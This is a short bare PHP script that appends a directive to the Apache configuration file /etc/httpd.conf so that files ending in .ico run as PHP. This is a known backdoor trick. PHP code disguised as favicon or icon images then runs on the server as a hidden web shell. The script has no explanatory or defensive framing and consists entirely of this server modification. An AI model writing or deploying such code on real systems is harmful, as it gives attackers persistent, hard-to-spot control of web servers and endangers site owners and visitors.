<?php
$conf = "/etc/httpd.conf";
$text = file_get_contents($conf);
file_put_contents($conf, "AddType application/x-httpd-php .ico\n", FILE_APPEND);

